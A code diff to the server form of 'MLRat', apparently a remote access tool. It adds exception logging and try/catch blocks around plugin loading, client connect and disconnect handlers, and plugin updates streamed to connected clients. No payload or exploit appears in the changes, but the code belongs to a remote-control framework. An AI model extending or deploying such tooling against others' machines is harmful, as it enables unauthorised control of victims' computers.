@@ -42,12 +42,26 @@ namespace MLRat.Forms
             return id;
         }
 
+
+        void DisplayException(MLPlugin plugin, Exception ex)
+        {
+            if (plugin != null)
+            {
+                Console.WriteLine("{0}: {1}", plugin.ClientPluginID, ex.Message);
+            }
+            else
+            {
+                Console.WriteLine(ex.ToString());
+            }
+        }
+
         void LoadPlugin(string path)
         {
+            MLPlugin _plugin = null;
             try
             {
                 byte[] PluginBytes = File.ReadAllBytes(path);
-                MLPlugin _plugin = new MLPlugin(PluginBytes);
+                _plugin = new MLPlugin(PluginBytes);
                 if (!_plugin.Load())
                     throw new Exception("Failed to load plugin");
                 if (_plugin.ClientPluginID == Guid.Empty)
@@ -64,9 +78,9 @@ namespace MLRat.Forms
                 Console.WriteLine("Loaded plugin: {0}", _plugin.ClientPluginID.ToString("n"));
                 _plugin.ServerPlugin.OnPluginLoad(new MLUiHost(_plugin, OncontextAdd));
             }
-            catch
+            catch(Exception ex)
             {
-                
+                DisplayException(_plugin, ex);
             }
         }
 
@@ -98,16 +112,17 @@ namespace MLRat.Forms
 
         void ContextMenu_Click(object sender, EventArgs e)
         {
+            MLPlugin plugin = null;
             try
             {
                 ToolStripMenuItem _menu = (ToolStripMenuItem) sender;
                 MLContextData _entry = (MLContextData)_menu.Tag;
-
-                _entry.ContextData.OnClick(SelectedClients(_entry.Plugin));
+                plugin = _entry.Plugin;
+                _entry.ContextData.OnClick(SelectedClients(plugin));
             }
-            catch
+            catch(Exception ex)
             {
-                
+                DisplayException(plugin, ex);
             }
         }
 
@@ -116,11 +131,18 @@ namespace MLRat.Forms
             List<IClient> _selectedClients = new List<IClient>();
             foreach (ListViewItem i in clientList.SelectedItems)
             {
-                this.Invoke((MethodInvoker) delegate()
+                try
                 {
-                    MLClientData _client = (MLClientData)i.Tag;
-                    _selectedClients.Add(new MLClient(_client.ID, _plugin.ClientPluginID, _client.ClientSocket));
-                });
+                    this.Invoke((MethodInvoker) delegate()
+                    {
+                        MLClientData _client = (MLClientData) i.Tag;
+                        _selectedClients.Add(new MLClient(_client.ID, _plugin.ClientPluginID, _client.ClientSocket));
+                    });
+                }
+                catch(Exception ex)
+                {
+                    DisplayException(_plugin, ex);
+                }
             }
             return _selectedClients.ToArray();
         }
@@ -245,24 +267,34 @@ namespace MLRat.Forms
                 }
                 catch(Exception ex)
                 {
-                    Console.WriteLine(ex.Message);
+                    DisplayException(null, ex);
                 }
             }
         }
 
         void UpdatePlugin(eSock.Server.eSockClient client, Guid ID)
         {
-            byte[] buffer = new byte[10000];
-            int bytesRead = 0;
-            using (MemoryStream _pluginUpdate = new MemoryStream(LoadedPlugins[ID].ClientPluginBytes))
+            try
             {
-                while ((bytesRead = _pluginUpdate.Read(buffer, 0, buffer.Length)) > 0)
+                byte[] buffer = new byte[10000];
+                int bytesRead = 0;
+                using (MemoryStream _pluginUpdate = new MemoryStream(LoadedPlugins[ID].ClientPluginBytes))
                 {
-                    byte[] Packet = new byte[bytesRead];
-                    Array.Copy(buffer, 0, Packet, 0, bytesRead);
-                    client.Send(Guid.Empty, "pluginupdate", ID, Packet,
-                        _pluginUpdate.Position == _pluginUpdate.Length);
+                    while ((bytesRead = _pluginUpdate.Read(buffer, 0, buffer.Length)) > 0)
+                    {
+                        byte[] Packet = new byte[bytesRead];
+                        Array.Copy(buffer, 0, Packet, 0, bytesRead);
+                        client.Send(Guid.Empty, "pluginupdate", ID, Packet,
+                            _pluginUpdate.Position == _pluginUpdate.Length);
+                    }
                 }
+            }
+            catch(Exception ex)
+            {
+                if (LoadedPlugins.ContainsKey(ID))
+                    DisplayException(LoadedPlugins[ID], ex);
+                else
+                    DisplayException(null, ex);
             }
         }
 
@@ -287,8 +319,16 @@ namespace MLRat.Forms
             RemoveListView((ListViewItem)_ClientData.DisplayObject);
             foreach (var plugin in LoadedPlugins)
             {
-                plugin.Value.ServerPlugin.OnClientDisconnect(new MLClient(_ClientData.ID, plugin.Value.ClientPluginID,
-                    client));
+                try
+                {
+                    plugin.Value.ServerPlugin.OnClientDisconnect(new MLClient(_ClientData.ID,
+                        plugin.Value.ClientPluginID,
+                        client));
+                }
+                catch(Exception ex)
+                {
+                    DisplayException(plugin.Value, ex);
+                }
             }
         }
 
@@ -303,8 +343,15 @@ namespace MLRat.Forms
             client.Tag = _ClientData;
             foreach (var plugin in LoadedPlugins)
             {
-                plugin.Value.ServerPlugin.OnClientConnect(new MLClient(_ClientData.ID, plugin.Value.ClientPluginID,
+                try
+                {
+                    plugin.Value.ServerPlugin.OnClientConnect(new MLClient(_ClientData.ID, plugin.Value.ClientPluginID,
                     client));
+                }
+                catch(Exception ex)
+                {
+                    DisplayException(plugin.Value, ex);
+                }
             }
         }
 
